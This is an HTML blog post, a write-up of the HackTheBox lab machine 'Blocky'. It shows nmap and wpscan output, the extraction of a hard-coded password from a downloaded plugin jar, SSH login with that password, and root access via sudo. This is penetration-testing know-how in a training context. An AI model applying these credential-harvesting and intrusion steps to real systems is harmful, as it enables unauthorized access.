@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>HTB Blocky - Write Up</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">HTB Blocky - Write Up</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/hackthebox/2017-12-09-htb_blocky_writeup/">HTB Blocky - Write Up</a></h4>
+    <h5>December 9, 2017</h5>
+    
+    <a href="https://0x23b.github.io/tags/hackthebox"><kbd class="item-tag">HackTheBox</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p>IP: 10.10.10.37</br>
+OS: Linux</br></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Blocky# nmap -sC -sV -oA nmap 10.10.10.37
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017–12–04 21:15 EST
+Nmap scan report for 10.10.10.37
+Host is up (0.15s latency).
+Not shown: 996 filtered ports
+PORT STATE SERVICE VERSION
+21/tcp open ftp ProFTPD 1.3.5a
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
+|_ 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: BlockyCraft &amp;#8211; Under Construction!
+8192/tcp closed sophos
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
+</code></pre>
+
+<p>After an initial nmap scan we can see, that wordpress is running on port 80. Let&rsquo;s run wpscan with &ndash;enumerate u option:</p>
+
+<h2 id="wpscan">WPscan</h2>
+
+<pre><code class="language-bash">[+] URL: http://10.10.10.37/
+[+] Started: Thu Dec 4 21:19:35 2017
+
+...
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Enumerating usernames ...
+[+] Identified the following 1 user/s:
++----+-------+---------+
+| Id | Login | Name    |
++----+-------+---------+
+| 1  | notch | Notch – |
++----+-------+---------+
+</code></pre>
+
+<p>In parallel I ran dirbuster and found, that a plugin folder exists. When browsing that directory we can see, that two files are in there: BlockyCore.jar and griefprevention.jar. We can download both files, extract BlockyCore.jar and run strings on it:</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/Blocky# strings com/myfirstplugin/BlockyCore.class
+...
+root
+8YsqfCTnvxAUeduzjNSXe22
+...
+</code></pre>
+
+<p>The output looks like credentials: &ldquo;root:8YsqfCTnvxAUeduzjNSXe22&rdquo;. First I tried to ssh with root, which failed. But then I tried with the user notch: Success!</p>
+
+<h2 id="user-access">User access</h2>
+
+<pre><code class="language-bash">root@kali:~/HTB/Blocky$ ssh root@10.10.10.37
+root@10.10.10.37's password:
+
+root@kali:~/HTB/Blocky# ssh notch@10.10.10.37        
+notch@10.10.10.37's password:
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+Last login: Mon Dec  4 15:31:51 2017 from 10.10.14.174
+notch@Blocky:~$
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>With sudo -l we can see, that notch is basically admin on the machine and can execute ALL commands:</p>
+
+<pre><code class="language-bash">notch@Blocky:~$ sudo -l
+[sudo] password for notch: 8YsqfCTnvxAUeduzjNSXe22
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+</code></pre>
+
+<p>We can now easily escalate privileges:</p>
+
+<pre><code>notch@Blocky:/$ sudo su
+root@Blocky:/$
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
